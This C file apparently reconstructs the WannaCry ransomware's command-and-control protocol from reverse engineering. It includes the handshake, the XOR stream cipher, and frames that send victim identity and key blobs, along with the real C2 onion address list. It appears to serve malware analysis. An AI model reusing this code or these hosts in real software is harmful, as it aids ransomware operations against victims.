// c2_protocol.cpp — pure frame builders. No sockets, no IO (see c2_protocol.h).
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2_protocol.h"

// FUN_00412b00 — RFC1071 ones-complement checksum (REVIEW claim 7).
u16 wcry_rfc1071_checksum(const u8 *p, u32 len)
{
    u32 sum = 0;
    while (len > 1) { sum += (u32)(u16)(p[0] | (p[1] << 8)); p += 2; len -= 2; }
    if (len) sum += *p;
    while (sum >> 16) sum = (sum & 0xFFFFu) + (sum >> 16);
    return (u16)~sum;
}

// ---- SOCKS5 byte structures (FUN_0040d8c0; builders only, never connect) --

int wcry_socks5_greeting(u8 out[3])
{
    out[0] = 0x05; out[1] = 0x01; out[2] = 0x00;   // ver5, 1 method, NO-AUTH
    return 3;                                      // send(handle, buf, 3)
}

int wcry_socks5_connect_domain(u8 *out, u32 cap, const char *host, u16 port)
{
    u32 hl, need, i;
    if (!out || !host) return -1;
    hl = (u32)strlen(host);
    if (hl == 0 || hl > 255) return -1;
    need = 4 + 1 + hl + 2;
    if (cap < need) return -2;
    out[0] = 0x05; out[1] = 0x01; out[2] = 0x00;
    out[3] = 0x03;                                 // ATYP_DOMAINNAME (0x3000105)
    out[4] = (u8)hl;
    for (i = 0; i < hl; i++) out[5 + i] = (u8)host[i];
    out[5 + hl]     = (u8)(port >> 8);             // port big-endian
    out[5 + hl + 1] = (u8)(port & 0xFF);
    return (int)need;
}

int wcry_socks5_connect_ipv4(u8 *out, u32 cap, const u8 ip[4], u16 port)
{
    if (!out || !ip) return -1;
    if (cap < 10) return -2;
    out[0] = 0x05; out[1] = 0x01; out[2] = 0x00;
    out[3] = 0x01;                                 // ATYP_IPV4 (0x1000105)
    out[4] = ip[0]; out[5] = ip[1]; out[6] = ip[2]; out[7] = ip[3];
    out[8] = (u8)(port >> 8);
    out[9] = (u8)(port & 0xFF);
    return 10;
}

// FUN_0040d0a0 — session handshake frame (REVIEW claim 5).
int wcry_handshake_frame(u8 *out, u32 cap, u8 cmd1, u8 cmd2,
                         u32 padLen, u8 key31_out[31])
{
    u32 n = padLen, i;
    u16 ck;
    if (!out) return -1;
    if (cap < padLen + 36) return -2;
    for (i = 0; i < n + 31; i++) out[i] = (u8)(rand() % 200);   // rand()%200 fill
    if (key31_out) memcpy(key31_out, out + n, 31);
    out[n + 31] = cmd1;
    out[n + 32] = 0x00;
    out[n + 33] = cmd2;
    ck = wcry_rfc1071_checksum(out + n, 0x1F);                  // over the key
    out[n + 34] = (u8)(ck & 0xFF);                              // LE store
    out[n + 35] = (u8)(ck >> 8);
    return (int)(padLen + 36);                                  // "send n+36"
}

// FUN_0040d2b0 — rolling XOR stream (REVIEW claim 6), corrected array model:
// window key[0..0x1D], current byte key[0x1E], feedback tap key[0x0B].
void wcry_xor_crypt(u8 key[31], u8 *buf, int len)
{
    int i;
    if (!key || !buf) return;
    for (i = 0; i < len; i++) {
        u8 cur = key[0x1E];
        u8 tap = key[0x0B];
        buf[i] ^= cur;
        memmove(&key[1], &key[0], 0x1E);        // slide 30-byte window
        key[0] = (u8)(cur ^ tap);               // feedback
    }
}

// ---- payment/contact frames ------------------------------------------------

// Validated onion set, literal @c.wnry+0xE4 (REVIEW claim 4).
const char WCRY_C2_ONION_LIST[] =
    "gx7ekbenv2riucmf.onion;57g7spgrzlojinas.onion;xxlvbrloxvriy2c5.onion;"
    "76jdd2ir2embyv47.onion;cwwnhwhlz52maqm7.onion";

void wcry_frame_init(wcry_frame_t *f)
{
    f->cap = 0x1000;                       // FUN_0040dbb0: 4 KB inline buffer
    f->buf = (u8*)malloc(f->cap);
    f->used = 0;
}

void wcry_frame_free(wcry_frame_t *f)
{
    free(f->buf);
    f->buf = 0; f->used = 0; f->cap = 0;
}

static int frame_reserve(wcry_frame_t *f, u32 extra)   // 4 KB growth steps
{
    if (f->used + extra <= f->cap) return 0;
    {
        u32 ncap = f->cap + (((f->used + extra) - f->cap + 0xFFFu) & ~0xFFFu);
        u8 *nb = (u8*)realloc(f->buf, ncap);
        if (!nb) return -1;                    // original throws "memory"
        f->buf = nb; f->cap = ncap;
    }
    return 0;
}

void wcry_frame_write(wcry_frame_t *f, const void *data, u32 len)   // FUN_0040dc00
{
    if (!f || !f->buf || len == 0) return;
    if (frame_reserve(f, len) != 0) return;
    memcpy(f->buf + f->used, data, len);
    f->used += len;
}

void wcry_frame_write_str(wcry_frame_t *f, const char *s)           // FUN_0040dd00
{
    if (s) wcry_frame_write(f, s, (u32)strlen(s));
}

// FUN_0040bed0 header order (REVIEW claim 15): id(8) | computer | cmd(1) | user.
static int frame_proto_header(wcry_frame_t *f, u64 installId,
                              const char *computer, u8 cmd, const char *user)
{
    u8 id8[8];
    int i;
    for (i = 0; i < 8; i++) id8[i] = (u8)(installId >> (8 * i));   // LE
    wcry_frame_write(f, id8, 8);
    wcry_frame_write_str(f, computer);          // GetComputerNameA lane
    wcry_frame_write(f, &cmd, 1);
    wcry_frame_write_str(f, user);              // GetUserNameA lane
    return (f->buf && f->used >= 8) ? 0 : -1;
}

int wcry_frame_cmd_0B(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *msg)
{
    if (frame_proto_header(f, installId, computer, 0x0B, user) != 0) return -1;
    wcry_frame_write_str(f, msg);               // FUN_0040c154
    return 0;
}

int wcry_frame_cmd_0C(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *dkyName,
                      const u8 *pkyBlob, u32 pkyLen)
{
    u8 zero4[4] = {0, 0, 0, 0};
    u8 lb[4];
    if (frame_proto_header(f, installId, computer, 0x0C, user) != 0) return -1;
    wcry_frame_write_str(f, dkyName);           // FUN_0040c3a8 "%08X.dky"
    wcry_frame_write(f, zero4, 4);
    wcry_frame_write_str(f, "WanaCrypt0r");     // trailing strings
    wcry_frame_write_str(f, "");
    lb[0] = (u8)(pkyLen);
    lb[1] = (u8)(pkyLen >> 8);
    lb[2] = (u8)(pkyLen >> 16);
    lb[3] = (u8)(pkyLen >> 24);
    wcry_frame_write(f, lb, 4);
    wcry_frame_write(f, pkyBlob, pkyLen);       // .pky blob bytes
    return 0;
}

int wcry_frame_cmd_0D(wcry_frame_t *f, u64 installId, const char *computer,
                      const char *user, const char *msg)
{
    if (frame_proto_header(f, installId, computer, 0x0D, user) != 0) return -1;
    wcry_frame_write_str(f, msg);
    return 0;
}

// ---- onion list parser ------------------------------------------------------

int wcry_onions_parse(const u8 *field, u32 fieldLen, char (*out)[64], int maxOut)
{
    u32 i = 0;
    int n = 0;
    if (!field || !out || maxOut <= 0) return 0;
    while (i < fieldLen && field[i] == 0) i++;      // NUL lead-in to literal (0xE0->0xE4)
    while (i < fieldLen && n < maxOut) {
        u32 start = i, len;
        while (i < fieldLen && field[i] != ';' && field[i] != ',' && field[i] != 0) i++;
        len = i - start;
        if (len == 0) { i++; continue; }            // skip empty tokens
        if (len > 63) return n;                     // overlong host: stop cleanly
        memcpy(out[n], field + start, len);
        out[n][len] = 0;
        n++;
        if (i >= fieldLen || field[i] == 0) break;  // NUL tail = end of list
        i++;
    }
    return n;
}
